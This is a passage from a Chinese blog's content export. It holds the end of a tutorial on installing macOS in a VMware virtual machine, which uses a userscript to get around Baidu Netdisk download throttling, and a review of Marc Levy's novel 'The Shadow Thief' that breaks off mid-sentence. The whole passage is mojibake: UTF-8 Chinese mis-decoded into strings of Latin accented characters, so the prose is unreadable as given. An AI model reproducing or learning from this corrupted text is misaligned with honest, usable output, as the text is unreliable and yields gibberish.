OSä¹‹æ—…ï¼Œå†³å®šè¿˜æ˜¯è£…ä¸ªè™šæ‹Ÿæœºï¼Œä»¥å…æƒ³ç©Macçš„æ—¶å€™å†…å¿ƒç©ºè™šã€‚\nè¿™ç¯‡æ•™ç¨‹é‡Œé¢çš„ç»å¤§éƒ¨åˆ†æ“ä½œä»æ˜¯å¯è¡Œçš„ï¼ä» unlocker åˆ°ä¸‹æ–‡çš„ Temper Monkey å’Œç›´è¿åŠ©æ‰‹ï¼Œæ²¡æƒ³åˆ°æ—¶éš”ä¸€å¹´ï¼Œè¿™ç¯‡å°æ–‡ç« çš„å¯å¤ç°æ€§è¿˜é‚£ä¹ˆé«˜ï¼Œçœ‹æ¥å½“åˆçæŠ˜è…¾å–å¾—çš„è¿™ç‚¹å®è·µç»éªŒè¿˜æ˜¯å¾ˆå¯è´µçš„ã€‚\nè¨€å½’æ­£ä¼ ï¼Œæ­¤æ¬¡å¤ç°æ”¾å¼ƒäº†IDMï¼Œè€Œé€‰ç”¨äº† å…è´¹çš„ NDM ï¼Œåœ¨å®ƒè·‘èµ·æ¥çš„é‚£ä¸€åˆ»ï¼Œå†…å¿ƒæ³›èµ·äº†ä¸€ä¸æ¬£å–œ~\nNDM ä¸‹è½½å¹¶å®‰è£…Temper Monkey é¼é¼æœ‰åçš„Temper Monkeyï¼ˆæ²¹çŒ´ï¼‰æ˜¯ä¸€ä¸ªæµè§ˆå™¨æ’ä»¶ç®¡ç†å™¨ï¼Œä½¿ç”¨è¿™ä¸ªä¸œè¥¿ä½ å¯ä»¥æ–¹ä¾¿åœ°ä¸‹è½½å¹¶ä½¿ç”¨å¤§ä½¬ä»¬åˆ›é€ å¹¶åˆ†äº«å‡ºæ¥çš„JavaScriptç¨‹åºã€‚åœ¨Edgeçš„æ‰©å±•å•†åº—ä¸­æ‰¾åˆ°Temper Monkeyï¼Œä¸‹è½½å¹¶å®‰è£…å°±è¡Œäº†ã€‚\nå®‰è£…ç›´é“¾åŠ©æ‰‹ ç›´é“¾ æ˜¯æŒ‡ç™¾åº¦ç½‘ç›˜ä¸­çš„èµ„æºå®é™…å­˜å‚¨çš„é“¾æ¥ï¼Œæˆ‘ä»¬é€šè¿‡è¿™ä¸ªé“¾æ¥ç›´æ¥è®¿é—®è¿™ä¸ªèµ„æºï¼Œå°±ä¸ç”¨ç»è¿‡å‘çˆ¹çš„é™é€ŸæœåŠ¡å™¨äº†ï¼ æ¿€æ´»Temper Monkeyä¹‹åï¼Œå¯ä»¥ç›´æ¥ç‚¹å‡»å®ƒæœç´¢æˆ‘ä»¬éœ€è¦çš„è„šæœ¬ã€‚ Find new scripts å½“ç„¶ï¼Œæˆ‘å·²ç»äº²æµ‹äº†è‹¥å¹²æ¬¾ç›´é“¾åŠ©æ‰‹ï¼Œå¯ç”¨çš„ä¸€æ¬¾å¯ä»¥ä» è¿™é‡Œ ä¸‹è½½ã€‚ ä½¿ç”¨è¿™ä¸ªåŠ©æ‰‹ï¼Œä½ éœ€è¦å°†ç›®æ ‡èµ„æºå…ˆè½¬å­˜åˆ°è‡ªå·±çš„ç½‘ç›˜ä¸­ï¼Œç„¶åè¿›è¡Œç›´é“¾æå–ï¼Œå¦åˆ™æå–åˆ°çš„é“¾æ¥å¯èƒ½è¢«é˜»æ­¢è®¿é—®ã€‚ åœ¨è‡ªå·±çš„ç½‘ç›˜ä¸­ï¼Œé€‰ä¸­ä½ æ‰€éœ€è¦çš„æ–‡ä»¶ï¼ˆåœ¨è¿™é‡Œå½“ç„¶æ˜¯Mac OSçš„é•œåƒäº†ï¼ï¼‰ï¼Œå·¥å…·æ ä¸­åº”è¯¥å‡ºç°ã€ç®€æ˜“ä¸‹è½½åŠ©æ‰‹ã€‘è¿™ä¸€æŒ‰é’®ï¼Œå•å‡»è¿›å»ï¼Œåé¢è·å–ç›´é“¾çš„æ“ä½œå°±æ˜¯å‚»ç“œæ­¥éª¤äº†ã€‚\nDownload Manager è·å–ç›´é“¾åœ°å€ä¹‹åï¼Œæ ¹æ®å®ƒçš„æç¤ºå…ˆè®¾ç½®å¥½IDMçš„ä¸€äº›å‚æ•°ï¼Œç„¶åæ–°å»ºä¸€ä¸ªä¸‹è½½ä»»åŠ¡ï¼ŒæŠŠç›´é“¾å¡«è¿›å»ï¼Œå¼€å§‹æ„‰å¿«åœ°ä¸‹è½½ä½ çš„é•œåƒå§ï¼\nDownload speed å®‰è£…è™šæ‹Ÿæœº ç›´æ¥å‡å®šä½ å·²ç»ä¼šå®‰è£…è™šæ‹Ÿæœºäº†ï¼Œè¿™ä¸€æ­¥å°±è¯´å¾—ç®€å•ä¸€ç‚¹å§ã€‚ åœ¨åˆ›å»ºè™šæ‹Ÿæœºæ—¶ç»™ä»€ä¹ˆæ ·çš„é…ç½®åˆé€‚å‘¢ï¼Ÿæˆ‘çš„é…ç½®æ˜¯ï¼š\n2æ ¸CPU 6Gå†…å­˜ 50Gç¡¬ç›˜ é™¤äº†å¼€æœºæœ‰ç‚¹æ…¢ä¹‹å¤–ï¼ˆå¯èƒ½å› ä¸ºæˆ‘çš„è™šæ‹Ÿæœºæ”¾åœ¨å®¿ä¸»æœºçš„æœºæ¢°ç¡¬ç›˜ä¸Šï¼‰ï¼Œè¿è¡Œèµ·æ¥è¿˜æ˜¯æ¯”è¾ƒæµç•…çš„ã€‚ ç¬¬ä¸€æ¬¡æ‰“å¼€æ—¶ï¼Œä¸è¦ç›´æ¥é€‰æ‹©ã€å®‰è£…macOSã€‘ï¼Œè€Œè¦åœ¨è®¾ç½®å®Œè¯­è¨€åå…ˆé€‰æ‹©ã€ç£ç›˜å·¥å…·ã€‘ï¼Œé€‰æ‹©VMWare Virtual SATAï¼Œå¹¶ã€æŠ¹æ‰ã€‘ç›˜ç¬¦å†…å®¹åŠè®¾ç½®åç§°ã€‚ ä¸‹é¢ä¸¤å¹…å›¾æ¥è‡ªå‚è€ƒèµ„æ–™[1]ã€‚\nProcess disk first Erase disk å®Œæˆä¹‹åæŒ‰ã€Escã€‘è¿”å›ä¸Šä¸€ä¸ªé¡µé¢ï¼Œé€‰æ‹©ã€å®‰è£…macOSã€‘ï¼Œä¸€è·¯å¾€ä¸‹èµ°å³å¯ã€‚\nè¿›å…¥æ¡Œé¢åï¼Œä½ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å®‰è£…ç³»ç»Ÿæ—¶ä½¿ç”¨çš„å…‰ç›˜ï¼Œå³é”®é€‰æ‹©æ¨å‡ºå…‰ç›˜ï¼Œç„¶ååœ¨VMWareçš„MacOSæ ‡ç­¾ä¸Šå³é”®é€‰æ‹©ã€å®‰è£…VMWare Toolsã€‘ï¼Œä¸€ç›´ç»§ç»­å®‰è£…ã€‚\næ­¤æ—¶ï¼Œä¼šå¼¹å‡ºä¸€ä¸ªVMWareçš„ç³»ç»Ÿè½¯ä»¶è¢«é˜»æ­¢è½½å…¥çš„æé†’ï¼Œæˆ‘ä»¬è¿›å…¥ã€ç³»ç»Ÿåå¥½è®¾ç½®ã€‘ï¼ˆä¹Ÿå°±æ˜¯Appleé€šç”¨çš„é‚£ä¸ªå°é½¿è½®æ ‡å¿—ï¼‰ï¼Œé€‰æ‹©ã€å®‰å…¨ä¸éšç§ã€‘ï¼Œå…ˆç‚¹å‡»å·¦ä¸‹è§’è§£é”ï¼Œç„¶åå…è®¸VMWareåœ¨æˆ‘ä»¬çš„ç”µè„‘ä¸Šå®‰è£…ç¨‹åºã€‚\næœ€åï¼Œå®‰è£…å®Œæ¯•ä¹‹åé‡å¯è™šæ‹Ÿæœºï¼Œå°±å¯ä»¥å¼€å§‹æ„‰å¿«çš„Mac OSä¹‹æ—…äº†ï¼\nåœ¨è¿™ä¸€æ­¥çš„è¿‡ç¨‹ä¸­æˆªçš„å›¾æ¯”è¾ƒå°‘ï¼Œä½ å¯ä»¥é˜…è¯»å‚è€ƒæ–‡ç« [1]æ¥è·å–æ›´å¤šçš„ä¿¡æ¯ã€‚\nè¿™ä¸€æ­¥ä¸‹æ¥ï¼Œæœ‰å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š\nVMWare Toolså¯èƒ½æ— æ³•ä¸€æ¬¡æˆåŠŸï¼Œç¡®ä¿ä½ åœ¨ã€å®‰å…¨ä¸éšç§ã€‘ä¸­å…è®¸VMWareå®‰è£…ç¨‹åºï¼›å¦‚æœå®ƒä¸ç”Ÿæ•ˆï¼Œå°±é‡æ–°å®‰è£…å‡ æ¬¡ã€‚ è™šæ‹Ÿæœºæ— æ³•è¿æ¥Wi-Fiï¼Œä½†æ˜¯ç”±äºæˆ‘ä»¬æ˜¯è™šæ‹Ÿæœºï¼Œå¯ä»¥ç›´æ¥è¿æ¥å®¿ä¸»æœºçš„ç½‘ç»œï¼Œ æ— éœ€å†æŠ˜è…¾ç½‘å¡é©±åŠ¨äº† ï¼è¿™ä¹Ÿæ˜¯è™šæ‹Ÿæœºä½“éªŒMac OSæ¯”çœŸå®ç‰©ç†æœºæ›´åŠ æ–¹ä¾¿çš„ä¸€ç‚¹ã€‚ä¸ºäº†ä½¿æˆ‘ä»¬çš„è™šæ‹Ÿæœºèƒ½å¤Ÿé€šè¿‡NATä¸Šç½‘ï¼Œè®°å¾—åœ¨ä»»åŠ¡ç®¡ç†å™¨ä¸­æŠŠç¬¬ä¸€æ­¥è§£é”VMWareæ—¶å…³é—­çš„ VMNetDHCP ç­‰æœåŠ¡é‡æ–°å¼€èµ·æ¥ã€‚ ä¿æŠ¤çŸ¥è¯†äº§æƒï¼Œä½“éªŒä½“éªŒä¹Ÿå°±å¥½äº†ï¼ŒçœŸå¿ƒå–œæ¬¢Macçš„è¯è®°å¾—ä¸ºä¿¡ä»°å……å€¼ï¼ æœ¬æ–‡ç¼–å†™äºMac OS ã€‚ MacOS animation Markdown edit å‚è€ƒèµ„æ–™ [1] å°ç”Ÿè§‚å¯Ÿå®¤.æ–°ç‰ˆVMWareä¹‹MacOSç³»ç»Ÿçˆ¬å‘è®°[EB/OL].2020-10-20 https://mp.weixin.qq.com/s/rqw9m8JVJ_XHi4Ufst_rsQ\n[2] https://github.com/paolo-projects/auto-unlocker/issues/40\n","date":"2021-04-30T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E5%B0%9D%E5%B0%9D%E9%B2%9C%E4%B8%BA%E8%87%AA%E5%B7%B1%E8%A3%85%E4%B8%80%E5%8F%B0mac-os%E8%99%9A%E6%8B%9F%E6%9C%BA/","title":"å°å°é²œâ€”â€”ä¸ºè‡ªå·±è£…ä¸€å°Mac OSè™šæ‹Ÿæœº"},{"content":"ã€Šå·å½±å­çš„äººã€‹æ˜¯ä¸€éƒ¨å¥½ä½œå“ã€‚\näººçš„ä¸€ç”Ÿä¼šé¢å¯¹å¾ˆå¤šç§æƒ…æ„Ÿï¼Œå¾ˆå¤§ä¸€éƒ¨åˆ†æ˜¯ä¸å¯è¨€ä¼ çš„ã€‚ç„¶è€Œï¼Œæ³•å›½äººé©¬å…‹Â·å•ç»´ç”¨ä»–çš„ç®€æ˜è€Œç²¾å·§çš„è®¾è®¡ã€æ¸©é¦¨è€Œå¹½é»˜çš„ç¬”è§¦å°†ä¸€äº›å®å¤§çš„ã€å¤æ‚çš„æƒ…æ„Ÿå‘ˆç°åœ¨è¯»è€…é¢å‰äº†ã€‚\nã€Šå·å½±å­çš„äººã€‹ç¡®å®æ˜¯ä¸€éƒ¨å¥½ä½œå“ã€‚\nå°ç”·å­©æœ‰ä¸€ä¸ªç‰¹æ®Šçš„èƒ½åŠ›â€”â€”ä¸å½±å­å¯¹è¯ã€‚å½“ä»–çš„å½±å­ä¸åˆ«äººçš„å½±å­è´´åˆ°ä¸€èµ·ï¼Œä»–å¯ä»¥ä»åˆ«äººçš„å½±å­é‚£é‡Œå¬åˆ°å½±å­ä¸»äººçš„ç§˜å¯†ï¼›å½“åˆ«äººçš„å½±å­æŒ¤å äº†è‡ªå·±å½±å­çš„ä½ç½®æ—¶ï¼Œåˆ«äººçš„å½±å­å°±è¢«å°ç”·å­©â€œå·â€èµ°äº†ã€‚\näººï¼Œæ€»æ˜¯æœ‰å¾ˆå¤šçš„ç§˜å¯†ï¼Œæ½œè—å†…å¿ƒçš„æ¸´æœ›ã€ä¸æ„¿æƒ³èµ·çš„å“€ä¼¤Â·Â·Â·Â·Â·Â·å¾—ç›Šäºâ€œå·â€å½±å­çš„èƒ½åŠ›ï¼Œå°ç”·å­©èƒ½å¤Ÿä»æœ€æ¸…æ™°çš„è§’åº¦ä¸äººäº¤å¾€ï¼Œä¸€åˆ‡éƒ½æ˜¯çº¯ç²¹çš„ï¼Œé™¤äº†è‡ªå·±çš„å†…å¿ƒã€‚\nå‹æƒ… å°ç”·å­©çš„ç¬¬ä¸€ä¸ªæœ‹å‹æ˜¯å­¦æ ¡çš„è­¦å«ä¼Šå‡¡ã€‚\nè¿™æ˜¯ä»–çš„å€¾å¬è€…ï¼Œåœ¨è¿™ä½å¿˜å¹´ä¹‹äº¤é¢å‰ï¼Œä»–å¯ä»¥è¯´å‡ºå¾ˆå¤šä¸œè¥¿ï¼šå¯¹æ¬ºå‡Œè‡ªå·±çš„é©¬æ ¼çš„ä¸æ»¡ã€å¯¹å¥³ç”Ÿä¼Šä¸½èç™½çš„æš—æ‹ï¼Œå¤§æ¦‚é™¤äº†è‡ªå·±â€œå·å½±å­â€çš„èƒ½åŠ›ï¼Œå…¶ä»–çš„éƒ½æ˜¯å¯ä»¥è¯´çš„ã€‚ä¼Šå‡¡åœ¨å°ç”·å­©çš„ç«¥å¹´é‡Œæˆ–å¤šæˆ–å°‘åœ°æ‰®æ¼”äº†ä¸€äº›çˆ¶äº²çš„è§’è‰²ï¼Œä»–å…·æœ‰ç”Ÿæ´»çš„ç»éªŒï¼Œæ˜¯ä¸€ä¸ªç¨³é‡çš„äººã€‚å°ç”·å­©å¯¹ä¼Šå‡¡çš„æ„Ÿæƒ…æ˜¯çæƒœï¼Œä½†å¹¶éå¯¹çˆ¶äº²é‚£æ ·çš„ä¾èµ–ã€‚\nå­¦æ ¡çš„ç…¤æ°”ç‚‰çˆ†ç‚¸äº†ï¼Œä¼Šå‡¡çš„å½±å­æ´»äº†èµ·æ¥ï¼Œå°ç”·å­©å¾ªç€ä»–çš„å½±å­æ•‘äº†ä¼Šå‡¡ä¸€æ¡å‘½ã€‚\nä¼Šå‡¡æœ€çæƒœçš„çºªå¿µå†Œè¢«çƒ§äº†ï¼Œå°ç”·å­©ä»ä»–çš„å½±å­ä¸­å¾—çŸ¥äº†ä¼Šå‡¡å¦ˆå¦ˆçš„äº‹æƒ…ã€‚\nä¸€ä½æŒšçˆ±ç€è‡ªå·±è…¹ä¸­å­©å­çš„æ¯äº²ï¼Œä¼šå¯¹è‡ªå·±çš„å­©å­è¯´äº›ä»€ä¹ˆå‘¢ï¼Ÿå°ç”·å­©è®©ä»–çš„å¦ˆå¦ˆå†™ä¸‹äº†è¿™æ ·ä¸€å°ç‰¹æ®Šçš„ä¿¡ï¼Œä»–æƒ³å¼¥è¡¥ä¼Šå‡¡çš„ç¼ºæ†¾ã€‚\nä¼Šå‡¡èµ°äº†ï¼Œä¸ºç€è‡ªå·±æœªæ›¾è§é¢çš„æ¯äº²ï¼Œä»–å¸Œæœ›å»è·µè¡Œå…¨å¤©ä¸‹æ¯äº²çš„å¿ƒæ„¿ï¼šè‡ªå·±çš„å­©å­èƒ½è¿‡ä¸Šå¹¸ç¦çš„ç”Ÿæ´»ã€‚ä¼Šå‡¡ï¼Œè¾›è‹¦äº†ä¸€ç”Ÿï¼Œé—æ†¾äº†ä¸€ç”Ÿï¼Œæ—¥å¤ä¸€æ—¥çš„è­¦å«å·¥ä½œç£¨ç­äº†ç”Ÿå‘½çš„çƒ­æƒ…ï¼Œä»–æœ¬æ¥å°†è¦è¿æ¥å¹¶é€èµ°ä¸€å±Šåˆä¸€å±Šçš„å°ç”·å­©ï¼Œä½†æ˜¯åœ¨æœ€ç»ˆï¼Œä»–çš„å½±å­å’Œä¸€ä¸ªâ€œå·å½±å­çš„äººâ€ç»™ä»–å¸¦æ¥äº†æ­¤ç”Ÿçš„æ„ä¹‰ã€‚\nå°ç”·å­©çš„ç¬¬äºŒä¸ªæœ‹å‹æ˜¯é¢åŒ…å¸ˆå®¶çš„å•å…‹ã€‚\nè¿™æ˜¯ä»–çš„åŒé¾„äººï¼Œæ˜¯ä»–ä¸€ç”Ÿçš„å¥½å‹ï¼Œæ˜¯ä»–è¿·èŒ«æ—¶å€™çš„æ˜ç¯ã€‚\nå•å…‹çš„æ¢¦æƒ³æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç»§æ‰¿å®¶ä¸šï¼Œåšä¸€ä¸ªå‡ºè‰²çš„é¢åŒ…å¸ˆå‚…å—ï¼Ÿä¸ï¼Œå—é™äºå®¶åº­çš„ç»æµæ¡ä»¶ï¼Œå•å…‹æ˜¯æ— æ³•å»è¿½æ±‚ä»–çš„åŒ»å­¦ç”Ÿæ¢¦æƒ³çš„ï¼Œåªèƒ½åœ¨å°é•‡ä¸Šï¼Œç»§æ‰¿å®¶ä¸šï¼Œåšä¸€ä¸ªå‡ºè‰²çš„é¢åŒ…å¸ˆå‚…ã€‚\nå•å…‹çš„å½±å­å’Œä¸€ä¸ªâ€œå·å½±å­çš„äººâ€ç»™ä»–å¸¦æ¥äº†é€æ¢¦çš„æœºä¼šã€‚å•å…‹çš„çˆ¶äº²ä¸çˆ±è‡ªå·±çš„å­©å­å—ï¼Ÿè‡ªå·±çš„å®¶åº­æ¡ä»¶ï¼Œè®©å­©å­å»æ”»è¯»åŒ»å­¦æ˜¯å¤šä¹ˆçš„å¥¢ä¾ˆï¼å¦‚æœæ²¡æœ‰é‚£ä¸ªå·å½±å­çš„äººï¼Œè¿™ä½é¢åŒ…å¸ˆå‚…æœ¬æ¥å·²ç»åšå¥½äº†è®©å­©å­ã€ä¹Ÿè®©è‡ªå·±åœ¨é—æ†¾ä¸­åº¦è¿‡ä½™ç”Ÿçš„æ‰“ç®—ï¼›åœ¨é‚£æ™šï¼Œå·å½±å­çš„äººæ¥æ‰¾è‡ªå·±ï¼Œæ— éœ€å¤šè¨€ï¼Œå¸Œæœ›è‡ªå·±ç»™å•å…‹ä¸€ä¸ªå®ç°æ¢¦æƒ³çš„æœºä¼šã€‚å®ç°å­©å­çš„æ¢¦æƒ³ï¼Œå¯¹è‡ªå·±çš„å®¶åº­æ¥è¯´æ˜¯ä½•å…¶å›°éš¾å•Šï¼ä¸€ä¸ªå¼ºå£®çš„é¢åŒ…å¸ˆå‚…ï¼Œåœ¨ä½œåŠå‰çš„é•¿æ¤…ä¸Šå“­å¾—æ— æ¯”ä¼¤å¿ƒã€‚\nå•å…‹ç»ˆç©¶æ˜¯å¾—åˆ°äº†é€æ¢¦çš„æœºä¼šã€‚æ¢¦æƒ³å’Œç°å®çš„å¯¹æ¯”æ˜¯å¤šä¹ˆå¼ºçƒˆï¼Œå¤æ‚æ— è¶£çš„åŠŸè¯¾æ˜¯æ¯ä¸ªäººéƒ½èƒ½æ‰¿å—çš„å—ï¼Ÿæˆ–è€…å¤–ç§‘æ€¥è¯Šçš„è¡€è‚‰æ¨¡ç³Šçš„ä¼¤å‘˜ï¼Œè§£å‰–å°é‚£ä»¤äººå‘æ€µçš„èº¯ä½“ï¼Œæ˜¼å¤œé¢ å€’çš„å·¥æ—¶ï¼Ÿå•å…‹å¾ˆå¹¸è¿ï¼Œä»–çš„çˆ¶äº²ä¸å†é€¼è¿«ä»–æˆä¸ºä¸€åé¢åŒ…å¸ˆï¼Œè®©ä»–å‡ºæ¥è¿½æ±‚è‡ªå·±çš„æ¢¦æƒ³ï¼›è€Œä»–è®¤æ¸…äº†è‡ªæˆ‘ï¼ŒçŸ¥é“äº†è‡ªå·±æœ€ç»ˆçš„æ¢¦æƒ³æ˜¯å½“ä¸€ä½ä¸ç”¨è§è¡€ã€ä¸ç”¨æ—è§‚åˆ«äººçš„æ­»åˆ«å°±èƒ½ä¸ºäººä»¬å¸¦æ¥æ¸©é¥±å’Œå¹¸ç¦çš„é¢åŒ…å¸ˆå‚…ã€‚\næ¸¡äººäº¦æ˜¯æ¸¡å·±ï¼Œå°ç”·å­©ä»è¿™ä¸¤ä»½çœŸæŒšçš„å‹æƒ…ä¸­æ”¶è·äº†å†…å¿ƒçš„æ¸…æ˜ã€‚å¦‚æœæ²¡æœ‰ä¼Šå‡¡ï¼Œç«¥å¹´æ—¶éƒç»“äºå¿ƒçš„å¿§æ„å¦‚ä½•å¼€è§£å‘¢ï¼Ÿå¦‚æœæ²¡æœ‰å•å…‹ï¼Œå°±æ²¡æœ‰æˆå¹´ä¹‹åçš„å¯¹ç«¥å¹´æ—§æƒ…çš„å‹‡æ•¢è¿½æ±‚ã€‚\nçˆ±æƒ… ä¸€ä¸ªå­©å­ï¼Œæ˜¯æ‡‚å¾—çˆ±æƒ…çš„å—ï¼Ÿ\nå°ç”·å­©èµ·åˆæ˜¯ä¸æ‡‚çš„ï¼Œå¯¹ä¼Šä¸½èç™½çš„æœ¦æœ¦èƒ§èƒ§çš„å¥½æ„Ÿï¼Œåªèƒ½å½’ç»“äºå¯¹ç¾çš„å¤©ç„¶è¿½æ±‚ã€‚ä½†æ˜¯å¾ˆå¿«ä»–å°±æ„è¯†åˆ°ï¼Œå”¯å…¶è¦ç»•äºå¿ƒï¼Œç»ä¹…ä¸å¿˜ï¼Œåˆ«æ¥æ€…ç„¶ï¼Œæ–¹å¯ç§°ä¸ºçˆ±æƒ…ã€‚\nå°ç”·å­©æ˜¯æ‡‚å¾—çˆ±æƒ…çš„ã€‚\nå…‹è•¾å„¿æ˜¯ä¸€ä¸ªå¤šä¹ˆå€¼å¾—çˆ±çš„å¥³å­©å•Šï¼å¥¹å’Œå·å½±å­çš„äººæ˜¯å¤šä¹ˆåˆé€‚çš„ä¼´ä¾£å•Šï¼\nâ€œæˆ‘ä¸çŸ¥é“å¯¹æˆ‘æ¥è¯´å“ªä¸€æ ·æ¯”è¾ƒç—›è‹¦ï¼Œæ˜¯ä»èƒŒåä¼ æ¥çš„è®ªç¬‘ï¼Œæˆ–æ˜¯æœæˆ‘å°„æ¥çš„è½»è§†çœ¼å…‰ã€‚è°ä¼šæ„¿æ„çˆ±ä¸Šä¸€ä¸ªæ— æ³•è¨€è¯­çš„å¥³å­©ï¼Œä¸€ä¸ªç¬‘æ—¶ä¼šå‘å‡ºå˜¶å“‘å«å£°çš„å¥³å­©ï¼Ÿè°èƒ½åœ¨æˆ‘å®³æ€•æ—¶ç»™æˆ‘å®‰å…¨æ„Ÿï¼Ÿæˆ‘çœŸçš„å¾ˆå®³æ€•ï¼Œæˆ‘ä»€ä¹ˆéƒ½å¬ä¸åˆ°ï¼ŒåŒ…æ‹¬è„‘æµ·ä¸­çš„å£°éŸ³ã€‚æˆ‘å®³æ€•é•¿å¤§ï¼Œæˆ‘å¾ˆå­¤å•ï¼Œæˆ‘çš„ç™½æ˜¼å¦‚åŒæ— æ­¢å¢ƒçš„é»‘å¤œï¼Œè€Œæˆ‘å¦‚åŒè¡Œå°¸èµ°è‚‰ä¸€èˆ¬ç©¿è¶Šå…¶ä¸­ã€‚â€\nä¸–ä¸Šæ²¡æœ‰ä»»ä½•ä¸€ä¸ªå¥³å­©æ•¢å¯¹ä¸€ä¸ªåˆšè®¤è¯†çš„ç”·å­©è¯´å‡ºåŒæ ·çš„è¯ã€‚è¿™äº›è¯å¹¶éç”±å…‹è•¾å„¿çš„å£ä¸­å‘å‡ºï¼Œè€Œæ˜¯å¥¹çš„å½±å­åœ¨æ²™æ»©ä¸Šä½ä½åœ°å‘æˆ‘è¯‰è¯´ï¼Œæˆ‘ç»ˆäºæ˜ç™½äº†ä¸ºä½•ä¹‹å‰å½±å­ä¼šå‘æˆ‘æ±‚æ•‘ã€‚\nâ€œå…‹è•¾å„¿ï¼Œä½ è¦çŸ¥é“ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œä½ æ˜¯å…¨ä¸–ç•Œæœ€ç¾ä¸½çš„å¥³å­©ï¼Œæ˜¯é‚£ç§å¯ä»¥ç”¨å˜¶å“‘å«å£°æ“¦å»å¤©ç©ºçš„é˜´æš—ã€æœ‰ç€å¤§æç´éŸ³è‰²èˆ¬çš„å¥³å­©ã€‚ä½ è¦çŸ¥é“ï¼Œå…¨ä¸–ç•Œæ²¡æœ‰ä¸€ä¸ªå¥³å­©å¯ä»¥åƒä½ ä¸€æ ·è®©é£ç­å¿«é€Ÿæ—‹è½¬ã€‚\nâ€œè¿™äº›è¯ï¼Œæˆ‘åªæ•¢æ‚„æ‚„åœ¨ä½ èƒŒåå–ƒå–ƒåœ°è¯´ï¼Œä¸æ•¢è®©ä½ å¬åˆ°ã€‚ä¸€é¢å¯¹ä½ ï¼Œæˆ‘å°±æˆäº†å“‘å·´ã€‚â€\nè‡ªç¬¬ä¸€æ¬¡åˆ†åˆ«ä¹‹åï¼Œåä½™å¹´é—´ä¸¤äººä¸æ›¾å†è§ã€‚å°ç”·å­©å»äº†ä¼Šä¸½èç™½ï¼Œéš”å¤©ä¾¿åˆ†æ‰‹äº†ï¼›è¯»åŒ»å­¦ç”Ÿæ—¶è®¤è¯†äº†è‹è²ï¼Œä»å‹æƒ…å‡æ ¼ä¸ºçˆ±æƒ…ä¹‹åï¼Œçˆ±æƒ…çš„å…‰ç»ˆç©¶é»¯æ·¡è¤ªè‰²ã€‚å°ç”·å­©æ²¡æœ‰å¾—åˆ°å¹¸ç¦ï¼Œç›´åˆ°ä»–å†æ¬¡å›åˆ°ä¸å…‹è•¾å„¿ç›¸è§çš„æµ·æ»©ï¼Œå›åˆ°ä¸¤äººç§˜å¯†çš„ç¯å¡”é‡Œã€‚\næˆ‘ç­‰äº†ä½ å››ä¸ªå¤å¤©ï¼Œä½ æ²¡æœ‰ä¿¡å®ˆæ‰¿è¯ºï¼Œä½ å†ä¹Ÿæ²¡æœ‰å›æ¥ã€‚é£ç­æ­»äº†ï¼Œæˆ‘å°†å®ƒåŸ‹è‘¬åœ¨è¿™é‡Œï¼Œè°çŸ¥é“å‘¢ï¼Œä¹Ÿè®¸æœ‰ä¸€å¤©ä½ ä¼šæ‰¾åˆ°å®ƒã€‚\nç½²åï¼šå…‹è•¾å„¿\næˆ‘çš„å¤æ—¥çŸ¥å·±å˜å¾—å¦‚ä½•äº†å‘¢ï¼Ÿé‚£ä¸ªå› ä¸ºå¬ä¸åˆ°å£°éŸ³ï¼Œè€Œè®©æˆ‘å¯ä»¥æ¯«ä¸ç•æƒ§åœ°å‘å¥¹å€¾è¯‰æ‰€æœ‰ç§˜å¯†çš„å°å¥³å­©å•Šï¼\næˆ‘é—­ä¸Šçœ¼ç›ï¼Œæˆ‘ä»¬æ›¾ç»è·‘å¾—ä¸Šæ°”ä¸æ¥ä¸‹æ°”ï¼Œè¢«å¸¦è·¯çš„è€é¹°é£ç­æ‹–ç€è·‘ï¼Œä½ æ”¾é£ç­çš„åŠŸåŠ›æ— äººèƒ½åŠï¼Œå¸¸å¸¸ä¼šæœ‰è·¯ä¸Šçš„è¡Œäººåœä¸‹è„šæ­¥ï¼Œåªä¸ºæ¬£èµä½ çµæ´»çš„æŠ€å·§ã€‚æ›¾ç»æœ‰å¤šå°‘æ¬¡ï¼Œæˆ‘ç‰µç€ä½ çš„æ‰‹èµ°åˆ°è¿™ç›¸åŒä¹‹åœ°ï¼Ÿä½ ç°åœ¨æ€æ ·äº†ï¼Ÿä½ å¦‚ä»Šèº«åœ¨ä½•æ–¹ï¼Ÿä½ åˆä¼šåœ¨å“ªä¸ªæ²™æ»©åº¦è¿‡æ¯ä¸ªå¤å¤©ï¼Ÿ\nä½•å…¶çš„å‡„ç¾å•Šï¼é—æ†¾æ€»æ˜¯è´¯ç©¿æ‰€æœ‰äººçš„äººç”Ÿï¼Œç«¥å¹´æœ€ç‚½çƒ­çš„æ„Ÿæƒ…è¢«æ—¶é—´å°˜å°ï¼Œæœ€ç»ˆæ©ç›–è®°å¿†çš„å°˜åŸƒå´è¢«ä¸€äº›å¶ç„¶çš„äº‹æƒ…æ‰€æ‹‚å»ï¼Œäºæ˜¯è¿™ä»æœªç†„ç­çš„æ„Ÿæƒ…å°±æ— æ¯”çŒ›çƒˆåœ°è¿¸å‘å‡ºæ¥äº†ã€‚\nç»“å±€æ˜¯å¾ˆç¾å¥½çš„ï¼Œå°ç”·å­©æ‰¾åˆ°äº†å…‹è•¾å„¿çš„ä½æ‰€ï¼Œç”¨ä¸€ç§æµªæ¼«çš„æ–¹å¼è¡¨è¾¾å‡ºè‡ªå·±è¿Ÿåˆ°çš„æ­‰æ„ï¼š\næ­¤æ—¥æ¸…æ™¨ï¼Œæˆ‘å›åˆ°åŸåœ°ï¼Œæ—©æ™¨å’Œç…¦çš„é£å¾®å¾®å¹æ‹‚ï¼Œæˆ‘å¸¦æ¥äº†æˆ‘çš„é£ç­ã€‚æ‰åˆšå±•å¼€ï¼Œâ€œè€é¹°â€çš„åŒç¿¼å°±é¼“äº†èµ·æ¥ï¼Œç„¶åå¿«é€Ÿé£èµ·ã€‚å‡ ä¸ªè¡Œäººé¥¶æœ‰å…´å‘³åœ°åœä¸‹è„šæ­¥è§‚çœ‹ï¼Œç„¶åæ‰ç»§ç»­èµ¶è·¯ã€‚ä¿®è¡¥è¿‡çš„è€é¹°é£ç­æ²¿ç€å»ºç­‘ç‰©æ­£é¢æ”€çˆ¬è€Œä¸Šï¼Œè¿˜åœ¨å››æ¥¼çš„çª—æˆ·å‰æ—‹è½¬äº†å‡ 